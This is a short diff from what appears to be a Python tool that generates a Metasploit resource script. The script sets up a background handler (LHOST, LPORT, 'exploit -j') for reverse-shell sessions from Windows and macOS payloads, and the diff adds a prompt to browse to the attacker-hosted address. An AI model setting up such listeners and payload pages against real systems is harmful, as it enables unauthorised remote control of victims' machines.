@@ -117,6 +117,8 @@ set LHOST {ip_address}
 set LPORT {osx_port}
 set ExitOnSession False
 exploit -j
+
+echo "You may now surf to http://{ip_address}/"
 """.format(
     ip_address=ip_address,
     windows_payload=windows,
